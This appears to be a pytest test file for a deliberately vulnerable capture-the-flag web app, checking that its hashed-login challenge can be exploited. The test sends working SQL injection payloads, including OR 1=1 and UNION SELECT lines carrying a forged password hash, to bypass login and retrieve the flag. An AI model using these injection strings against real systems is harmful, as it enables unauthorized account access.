import pytest
import os, json
from app.account.models import User
from app import db_seed
from app import create_app ,db

mimetype = 'application/json'
headers = {
    'Content-Type': mimetype
}

@pytest.fixture
def app():
    app = create_app('sqliauthbypasshashed')
    app.config.update({
        "TESTING": True,
    })

    yield app

@pytest.fixture()
def client(app):
    return app.test_client()

def setup_function():
    app = create_app('sqliauthbypasshashed')
    with app.app_context():
        db.session.commit()
        db.drop_all()
        db.create_all()
        db_seed()
        from app.challenge.sqliauthbypasshashed import seed
        seed(app)
    return app
  
def teardown_function():
    os.remove('app.db')

class TestChallengeClass:    
  @classmethod
  def setup_class(self):
    app = setup_function()
    with app.app_context():
        User.insert_admin("admin","password")
        User.insert_user("user","password")
  @classmethod
  def teardown_class(self):
    teardown_function()

  def post_json(self,client, url ,data):
    return client.post(url, data=json.dumps(data), headers=headers)
  
  def put_json(self,client, url ,data):
    return client.put(url, data=json.dumps(data), headers=headers)

  def login_as_user(self, client):
    self.post_json(client,"/api/v1/auth/login",{"login": "user", "password": "password"})

  def logout(self, client):
    client.get("/api/v1/auth/logout")

  def login_as_admin(self, client):
    self.post_json(client,"/api/v1/auth/login",{"login": "admin", "password": "password"})

  def test_challenge_is_exploitable(self,client,app):
    os.environ['FLAG'] = "ThisIsMyFlag"
    db.session.commit()
    db.drop_all()
    db.create_all()
    db_seed()
    User.insert_user("user","password")
    from app.challenge.sqliauthbypasshashed import seed
    seed(app)
    assert self.post_json(client, "/api/v1/auth/login", {"login":'" OR 1=1--a', "password":""}).json['message'] == "Too much users"
    assert "sqlite3.OperationalError" in self.post_json(client, "/api/v1/auth/login", {"login":'"', "password":""}).json['message']
    assert self.post_json(client, "/api/v1/auth/login", {"login":'admin', "password":"admin"}).json['message'] == "Wrong credentials"
    assert "is not a good value for hash" in self.post_json(client, "/api/v1/auth/login", {"login":'" OR 1=1 LIMIT 1--a', "password":""}).json['message']
    assert "is not a good value for hash 3" in self.post_json(client, "/api/v1/auth/login", {"login":'" UNION SELECT 1,2,3,4,5,6 --a', "password":""}).json['message']
    print(self.post_json(client, "/api/v1/auth/login", {"login":'" UNION SELECT 1,2,"pbkdf2:sha256:260000$bGdgKnaRpKZY0JsZ$6a4b6bd29db0e922e36d8dd11b11d6f3f027c76a74647d2703794b23fff82a60",0,0,0 --a', "password":"test"}).json)
    login = client.get("/api/v1/user/profile")
    assert login.status_code == 200
    assert client.get("/api/v1/flag").status_code == 401
    self.post_json(client, "/api/v1/auth/login", {"login":'" UNION SELECT 6,2,"pbkdf2:sha256:260000$bGdgKnaRpKZY0JsZ$6a4b6bd29db0e922e36d8dd11b11d6f3f027c76a74647d2703794b23fff82a60",1,1,1 --a', "password":"test"})
    assert client.get("/api/v1/flag").status_code == 200
    assert client.get("/api/v1/flag").json['message'] == "ThisIsMyFlag"